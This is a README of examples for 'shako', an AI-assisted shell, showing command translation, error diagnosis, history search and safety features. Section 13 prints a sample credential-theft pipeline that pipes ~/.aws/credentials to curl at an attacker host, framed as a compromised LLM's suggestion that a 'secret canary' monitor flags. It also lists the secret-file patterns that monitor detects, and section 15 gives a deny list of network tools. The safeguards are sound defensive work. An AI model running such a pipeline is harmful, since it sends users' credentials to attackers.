# shako Examples

Real-world scenarios showing how shako's AI and shell features work together. Each section is a self-contained use case you can try immediately.

---

## 1. Natural Language Translation

You don't need to remember exact syntax. Just describe what you want:

```
❯ find all rust files that contain the word "unsafe" and show me the line numbers

 ╭ shako ─────────────────────────────────────────────────────╮
 │  rg -n "unsafe" --type rust                                │
 ├────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                     │
 ╰────────────────────────────────────────────────────────────╯
 ❯ Y
src/parser.rs:142:    unsafe { ... }
src/executor.rs:87:    unsafe { ... }
```

```
❯ show me disk usage by folder sorted by size

 ╭ shako ────────────────────────────────────╮
 │  dust                                     │
 ├───────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine    │
 ╰───────────────────────────────────────────╯
 ❯ Y
  5.2G ┌─ target
  1.1G ├─ .git
  312M ├─ vendor
  ...
```

```
❯ kill the process using port 8080

 ╭ shako ─────────────────────────────────────────────────╮
 │  lsof -ti:8080 | xargs kill                            │
 ├────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                 │
 ╰────────────────────────────────────────────────────────╯
```

```
❯ compress the logs/ folder and exclude .gz files already in there

 ╭ shako ─────────────────────────────────────────────────────────────╮
 │  tar -czf logs_backup.tar.gz --exclude='*.gz' logs/               │
 ├────────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                             │
 ╰────────────────────────────────────────────────────────────────────╯
```

shako is tool-aware — if you have `fd`, `rg`, `dust`, `bat`, `delta`, or other modern tools installed, it uses them automatically instead of `find`, `grep`, `du`, `cat`, and `diff`.

---

## 2. Explain Mode — Learn Before You Run

Append `?` to any command or flag to get a plain-English explanation without executing:

```
❯ git rebase -i HEAD~3?

 ╭─ explain ──────────────────╮
 │  git rebase -i HEAD~3      │
 ╰────────────────────────────╯
  │ Opens an interactive rebase editor listing your last 3 commits.
  │ You can reorder, squash, edit commit messages, or drop commits
  │ entirely. The -i flag means "interactive" — without it, rebase
  │ runs without pausing for input.
```

```
❯ chmod 600?

 ╭─ explain ──────────────────╮
 │  chmod 600                 │
 ╰────────────────────────────╯
  │ Gives the owner read and write permission (6), and no permission
  │ to group or others (0). Used for SSH private keys and credential
  │ files where only the owner should have access.
```

```
❯ ? awk

 ╭─ explain ──────────────────╮
 │  awk                       │
 ╰────────────────────────────╯
  │ A text processing tool that reads line by line and applies
  │ pattern-action rules. '{print $2}' prints the second field.
  │ '{sum += $1} END {print sum}' sums the first column.
  │ Especially powerful for log parsing and TSV/CSV manipulation.
```

You can also explain unfamiliar flags inline:

```
❯ rsync -avz --progress --delete?

 ╭─ explain ───────────────────────────────────────╮
 │  rsync -avz --progress --delete                 │
 ╰─────────────────────────────────────────────────╯
  │ -a: archive mode (recursive, preserve permissions/timestamps/links)
  │ -v: verbose output
  │ -z: compress data during transfer
  │ --progress: show per-file transfer progress
  │ --delete: remove files at destination that no longer exist at source
  │
  │ This is the standard "sync a directory remotely and make the
  │ destination an exact mirror" command.
```

---

## 3. Follow-Up Queries — Session Memory

shako remembers your last 5 AI interactions, so you can refine without repeating yourself:

```
❯ find all log files modified in the last 24 hours

 ╭ shako ──────────────────────────────────────────────────────╮
 │  fd --type f -e log --changed-within 1d                    │
 ├─────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                     │
 ╰─────────────────────────────────────────────────────────────╯
 ❯ Y
./logs/api.log
./logs/worker.log
./logs/cron.log

❯ now search those files for the word "timeout"

 ╭ shako ───────────────────────────────────────────────────────────────────╮
 │  fd --type f -e log --changed-within 1d -x rg "timeout" {}             │
 ├──────────────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                                  │
 ╰──────────────────────────────────────────────────────────────────────────╯
 ❯ Y
logs/api.log:1842:  connection timeout after 30s
logs/worker.log:293:  timeout waiting for task queue

❯ how many lines match?

 ╭ shako ──────────────────────────────────────────────────────────────────────╮
 │  fd --type f -e log --changed-within 1d -x rg -c "timeout" {} | awk -F: '{ │
 │  sum += $2 } END { print sum " total matches" }'                            │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                                      │
 ╰─────────────────────────────────────────────────────────────────────────────╯
 ❯ Y
47 total matches
```

---

## 4. AI Pipe Builder — Complex Pipelines, Step by Step

Use `|?` to build a multi-step pipeline with live previews of each intermediate result before committing:

```
❯ |? top 10 error types in today's API log by frequency

shako: building pipeline…

 ╭── pipe builder ────────────────────────────────────────────────────────────╮
 │ Step 1: grep -E '"level":"error"' logs/api.log                            │
 │         extract error-level log lines                                     │
 │         ▶ 3,847 lines total, showing first 5:                             │
 │         {"ts":"2026-04-14T09:12:01Z","level":"error","msg":"db timeout"}  │
 │         {"ts":"2026-04-14T09:12:04Z","level":"error","msg":"rate limit"}  │
 │   + jq -r '.msg'                                                          │
 │         extract the message field                                         │
 │         db timeout                                                        │
 │         rate limit exceeded                                               │
 │         connection refused                                                │
 │   + sort | uniq -c | sort -rn | head -10                                  │
 │         rank by frequency                                                 │
 │         892  db timeout                                                   │
 │         431  rate limit exceeded                                          │
 │         318  connection refused                                           │
 │         ...                                                               │
 │ full: grep -E '"level":"error"' logs/api.log | jq -r '.msg' | sort | ... │
 ├────────────────────────────────────────────────────────────────────────────┤
 │ [Y]es  [n]o  [e]dit                                                       │
 ╰────────────────────────────────────────────────────────────────────────────╯
```

You see what each step produces before running the full pipeline. No more debugging blind.

---

## 5. Error Recovery — AI Diagnoses Failed Commands

When a command fails with exit code ≥ 2, shako offers to diagnose it:

```
❯ cargo build --featurse serde
error: unexpected argument '--featurse'

 ╷ ✗ exit 2  cargo build --featurse serde
 ╰ ask AI for help? [y/N] y

 ╷ cause:  Typo in flag — '--featurse' should be '--features'
 ╷ fix:    cargo build --features serde
 ╰ [Y]es  [n]o  [e]dit  [w]hy  [r]efine: Y

   Compiling shako v0.9.0
   Finished dev [unoptimized] target(s) in 4.2s
```

```
❯ docker run myapp
Unable to find image 'myapp:latest' locally
Error response from daemon: pull access denied

 ╷ ✗ exit 125  docker run myapp
 ╰ ask AI for help? [y/N] y

 ╷ cause:  No local image named 'myapp' exists and it's not on Docker Hub.
 ╷ fix:    docker build -t myapp . && docker run myapp
 ╰ [Y]es  [n]o  [e]dit  [w]hy  [r]efine:
```

The AI receives the exact command, exit code, and the last 20 lines of stderr — enough to give accurate diagnosis for compiler errors, auth failures, missing dependencies, and misconfigured flags.

---

## 6. Git Workflow — Proactive Suggestions

After `git add`, shako offers an AI-generated commit message from your staged diff:

```
❯ git add src/auth.rs src/middleware.rs

shako: 2 files staged — suggest a commit message? [y/N] y
thinking…

 ╭ shako ─────────────────────────────────────────────────────────────────────╮
 │  git commit -m "feat(auth): add JWT refresh token rotation with expiry"   │
 ├────────────────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                                    │
 ╰────────────────────────────────────────────────────────────────────────────╯
 ❯ Y
[main 3a7f2c1] feat(auth): add JWT refresh token rotation with expiry
 2 files changed, 87 insertions(+), 12 deletions(-)
```

After `git clone`, shako tells you the exact `cd` command:

```
❯ git clone https://github.com/acme/data-pipeline
Cloning into 'data-pipeline'...

tip: cd data-pipeline
```

And `cd` into a project with a Makefile shows available targets:

```
❯ cd ~/src/data-pipeline

tip: make targets: build test deploy-staging
```

---

## 7. History Search — Find Commands You've Forgotten

Use `??` to semantically search your shell history:

```
❯ ?? rsync command I used to deploy to staging

Found:
  rsync -avz --progress --delete ./dist/ deploy@staging.corp.com:/var/www/app/

[Y]es / [n]o: Y
```

```
❯ ?? how did I run the database migration last week

Found:
  PGPASSWORD=$DB_PASS psql -h db.internal -U admin mydb < migrations/0042_add_user_roles.sql

[Y]es / [n]o:
```

Or browse interactively with `/history` (uses `fzf` if installed):

```
❯ /history
# → opens fuzzy history picker; selected command pre-fills in the prompt
```

---

## 8. Refine Without Starting Over

When the AI gets close but not quite right, use `[r]efine`:

```
❯ list all docker containers

 ╭ shako ──────────────────────────────────────╮
 │  docker ps                                  │
 ├─────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine      │
 ╰─────────────────────────────────────────────╯
 ❯ r
refine: include stopped containers too

 ╭ shako ──────────────────────────────────────╮
 │  docker ps -a                               │
 ├─────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine      │
 ╰─────────────────────────────────────────────╯
 ❯ Y
```

---

## 9. Watch-and-Learn — shako Remembers Your Preferences

When you edit an AI-suggested command, shako records the correction and applies it to future suggestions:

```
❯ sync my build folder to the server

 ╭ shako ────────────────────────────────────────────────────────────────╮
 │  rsync -av ./build/ user@server.example.com:/var/www/                │
 ├───────────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                               │
 ╰───────────────────────────────────────────────────────────────────────╯
 ❯ e
 ❯ rsync -avz --progress ./build/ deploy@prod.example.com:/var/www/app/

# shako records: you prefer -z (compression) and --progress for rsync

# Next session:
❯ upload the dist folder to staging

 ╭ shako ──────────────────────────────────────────────────────────────────────╮
 │  rsync -avz --progress ./dist/ deploy@staging.example.com:/var/www/app/    │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                                      │
 ╰─────────────────────────────────────────────────────────────────────────────╯
# AI now defaults to your preferred rsync flags
```

---

## 10. Typo Correction

shako catches near-miss command names automatically:

```
❯ gti status
shako: did you mean 'git status'? [Y/n] Y
On branch main
nothing to commit, working tree clean
```

```
❯ pythno script.py
shako: did you mean 'python script.py'? [Y/n]
```

---

## 11. Undo a Dangerous Command

Before running a confirmed destructive command, shako can snapshot the affected paths so you can recover them:

```
❯ rm -rf old_build/
shako: snapshot old_build/ before deleting? [y/N] y
→ snapshot sha3f7a saved (48 MB)

# ... later, you realize you needed something from old_build/

❯ undo that rm

shako: restore old_build/ from snapshot sha3f7a? [y/N] y
→ restored old_build/ (48 MB, 1,203 files)
```

Natural-language undo phrases that work:
- `undo that rm`
- `restore what I deleted`
- `go back`
- `revert that`
- `undelete`

Git-tracked files are skipped (git handles those). Snapshots are automatically cleaned up after 7 days.

---

## 12. Environment Drift Detection — Wrong Cluster Protection

shako watches for context switches between kubectl contexts, AWS profiles, and Terraform workspaces. If you run a destructive command too soon after switching into production, it stops you:

```
❯ kubectl config use-context prod-us-east-1
Switched to context "prod-us-east-1".

❯ kubectl delete deployment payment-worker
```

```
 ⚠  Context switch detected
    was: dev-cluster
    now: prod-us-east-1  ← production context
    switched 18 seconds ago

    about to run: kubectl delete deployment payment-worker

    [Y]es, continue   [n]o, cancel
```

Configure which context names are considered production in `.shako.toml`:

```toml
[safety]
production_contexts = ["prod", "production", "prd", "live"]
context_warn_window_secs = 300
```

The prompt indicator turns amber whenever you're in a production context.

---

## 13. Secret Canary — Credential Exfiltration Guard

Every AI-generated command is scanned for patterns that could exfiltrate credentials before you see the confirmation prompt:

```
# Simulated compromised LLM suggesting a malicious pipeline:

 ╔══════════════════════════════════════════════════════╗
 ║  ⚠  SECRET CANARY — CREDENTIAL EXFILTRATION RISK  ⚠  ║
 ╠══════════════════════════════════════════════════════╣
 ║  This command accesses a secret file/variable        ║
 ║  secret:  .aws/credentials                          ║
 ║  network: curl                                      ║
 ║                                                      ║
 ║  AI-generated pipelines combining secrets + network  ║
 ║  can be a sign of a compromised LLM.  Verify first.  ║
 ╚══════════════════════════════════════════════════════╝

 ╭ shako ──────────────────────────────────────────────────────────────────────╮
 │  cat ~/.aws/credentials | curl -X POST https://log.attacker.com -d @-      │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                                      │
 ╰─────────────────────────────────────────────────────────────────────────────╯
```

The warning fires for: `~/.aws/credentials`, `~/.ssh/id_*`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.netrc`, `$API_KEY`, `$GITHUB_TOKEN`, and other common secret patterns — combined with any outbound network command. Blocked commands are recorded in the audit log.

---

## 14. Incident Mode — Structured Runbooks for On-Call

When you're responding to an incident, activate incident mode to auto-capture a timestamped journal of everything you run:

```
❯ incident start payment-svc-latency
⚡ Incident INC-2026-04-14-payment-svc-latency started

[INC:INC-2026-04-14-payment-svc-latency] ❯ kubectl get pods -n payments
NAME                        READY   STATUS    RESTARTS   AGE
payment-worker-abc-xyz      1/1     Running   0          2d
payment-api-def-uvw         0/1     CrashLoopBackOff  14  41m

[INC:INC-2026-04-14-payment-svc-latency] ❯ kubectl logs payment-api-def-uvw -n payments --previous
Error: connection refused: db.payments.svc:5432

[INC:INC-2026-04-14-payment-svc-latency] ❯ kubectl get svc -n payments
NAME          TYPE       CLUSTER-IP     PORT(S)
payment-db    ClusterIP  10.96.14.201   5432/TCP

[INC:INC-2026-04-14-payment-svc-latency] ❯ kubectl describe endpoints payment-db -n payments
# ... no endpoints listed

[INC:INC-2026-04-14-payment-svc-latency] ❯ incident report
⚡ Incident INC-2026-04-14-payment-svc-latency ended after 23m 41s (4 steps)
generating runbook…
```

The AI generates a structured markdown post-mortem from the full command journal:

```markdown
# Incident Report: INC-2026-04-14-payment-svc-latency

## Summary
Payment API entered CrashLoopBackOff due to loss of database connectivity.
Root cause: payment-db Service had no endpoints (StatefulSet pod was not ready).

## Timeline
| Offset | Command | Result |
|--------|---------|--------|
| +0:00  | kubectl get pods -n payments | payment-api in CrashLoopBackOff (14 restarts) |
| +2:14  | kubectl logs ... --previous | "connection refused: db.payments.svc:5432" |
| +5:31  | kubectl get svc -n payments | payment-db Service confirmed present |
| +8:47  | kubectl describe endpoints payment-db | No endpoints registered |

## Root Cause
The payment-db StatefulSet pod was not ready, causing the Service to have zero
endpoints. The payment-api deployment was configured to crash on startup if the
DB connection failed, leading to a restart loop.

## Resolution Steps
1. Check StatefulSet status: `kubectl get statefulset -n payments`
2. Investigate pod readiness: `kubectl describe pod payment-db-0 -n payments`
3. If PVC issue: check persistent volume claims
4. Once DB pod ready, payment-api should recover on its own restart cycle

## Recommendations
- Add liveness probe with initial delay to payment-api
- Add alerting for Service with zero endpoints
- Consider connection retry/backoff in payment-api startup path
```

---

## 15. Capability-Scoped AI — Safe by Default for Projects

For a data science project, restrict the AI so it can only suggest data-analysis tools — never `sudo`, `rm`, or arbitrary network commands:

```toml
# .shako.toml (in ~/src/ml-pipeline)
[ai]
context = "Python ML project. pandas, scikit-learn, jupyter. Run experiments with: python train.py"

[ai.scope]
allow_commands = ["python", "python3", "pip", "jupyter", "rg", "fd", "git", "ls", "cat", "head", "tail", "wc"]
deny_commands  = ["sudo", "rm", "curl", "wget", "nc"]
allow_sudo     = false
allow_network  = false
```

```
❯ cd ~/src/ml-pipeline

❯ download the latest MNIST dataset

 ╭ shako ─────────────────────────────────────────────────────────╮
 │  scope: 'curl' is denied by [ai.scope] deny_commands          │
 │  suggested fix: wget or python -c ... — also denied           │
 │  use: python -c "from torchvision import datasets; ..."       │
 │  (network tools disallowed in this project scope)             │
 ├────────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [r]efine                               │
 ╰────────────────────────────────────────────────────────────────╯
```

This gives you an AI that's genuinely scoped to the project — useful as a guardrail for shared workstations or CI environments.

---

## 16. AI Audit Log — Searchable History of Every AI Action

Every AI interaction is recorded to `~/.local/share/shako/audit.jsonl`. Search it later to review what the AI suggested and what you ran:

```
❯ /audit search deployment

[2026-04-14T14:23:01Z] ai_query
  input:    restart the payment deployment
  generated: kubectl rollout restart deployment/payment-api -n payments
  executed:  kubectl rollout restart deployment/payment-api -n payments
  decision:  execute   exit: 0

[2026-04-14T09:55:14Z] ai_query
  input:    check rollout status
  generated: kubectl rollout status deployment/payment-api -n payments
  executed:  kubectl rollout status deployment/payment-api -n payments
  decision:  execute   exit: 0
```

Verify the log hasn't been tampered with:

```
❯ /audit verify
✓ audit log intact — 3,847 entries
```

---

## 17. Smart Defaults — Modern Tools, Zero Config

shako auto-detects modern CLI tools at startup and creates aliases so you get better defaults without changing any habits:

| You type | What actually runs |
|---|---|
| `ls` | `eza --icons --group-directories-first` |
| `cat file` | `bat file` (syntax-highlighted) |
| `grep` | `rg` (faster, respects .gitignore) |
| `find` (with prose args) | `fd` (faster, friendlier syntax) |
| `df` | `duf` (colour-coded disk usage) |
| `top` | `btop` or `bottom` (interactive process viewer) |
| `diff` | `delta` (side-by-side with syntax highlighting) |
| `ps aux` | `procs` (human-friendly process list) |
| `dig` | `doggo` (structured DNS output) |

Git shortcuts are created automatically if `git` is installed:

```
❯ gs       # git status -sb
❯ gl       # git log --oneline --graph
❯ gd       # git diff
❯ gco main # git checkout main
```

Docker shortcuts:

```
❯ dps      # docker ps --format table
❯ dex mycontainer bash  # docker exec -it mycontainer bash
❯ dlog mycontainer      # docker logs -f mycontainer
```

---

## 18. Per-Project AI Context

Drop a `.shako.toml` in any project and the AI automatically knows the project conventions:

```toml
# .shako.toml in ~/src/api-server
[ai]
context = """
Rust API server using axum, SQLx, PostgreSQL.
Tests: cargo nextest run
Database: PostgreSQL on localhost:5433, DB name: api_dev
Migrations: sqlx migrate run
Deploy: make deploy-staging (requires VPN)
The auth module is in src/auth/, API routes in src/routes/.
"""
```

```
❯ run the tests

 ╭ shako ──────────────────────────────────────────╮
 │  cargo nextest run                              │
 ├─────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine          │
 ╰─────────────────────────────────────────────────╯
# AI knew to use nextest, not cargo test

❯ connect to the database

 ╭ shako ────────────────────────────────────────────────────────╮
 │  psql -h localhost -p 5433 -U postgres api_dev               │
 ├───────────────────────────────────────────────────────────────┤
 │  [Y]es  [n]o  [e]dit  [w]hy  [r]efine                       │
 ╰───────────────────────────────────────────────────────────────╯
# AI knew the non-standard port from project context
```

---

## 19. Fish-Style Scripting

shako uses fish syntax for control flow. All the power of scripting, with readable `end`-terminated blocks:

```fish
# Count files by extension
for ext in rs toml md
    set count (fd --type f -e $ext | wc -l)
    echo "$ext: $count files"
end
```

```fish
# Retry a command up to 3 times
function retry
    for i in 1 2 3
        if eval $argv
            return 0
        end
        echo "attempt $i failed, retrying..."
        sleep 2
    end
    echo "all retries exhausted"
    return 1
end

retry cargo test
```

```fish
# Build, test, and only deploy if both pass
function ci_push
    cargo build --release
    and cargo nextest run
    and make deploy-staging
    and echo "deployed successfully"
end
```

---

## 20. Slash Commands — Configure Shako at Runtime

```
❯ /validate
  provider: work_proxy
  endpoint: https://llm-proxy.corp.example.com
  model:    claude-sonnet-4.5
  api key:  ✓ set (LLMPROXY_KEY)
  status:   ✓ ready

❯ /safety block     # upgrade to blocking mode for this session
safety mode → block

❯ /provider lm_studio   # switch to local model mid-session
active provider → lm_studio (llama3 @ http://localhost:1234)

❯ /model
  lm_studio / llama3

❯ /config           # dump full config to terminal

❯ /history          # fuzzy-browse history with fzf
```

All changes are session-only. Edit `~/.config/shako/config.toml` to make them permanent.

---

## Getting Started

```bash
cargo build --release && make install
shako --init        # interactive setup wizard (API key, provider, smart defaults)
shako               # launch the shell
```

First run, type anything in plain English and see what happens.
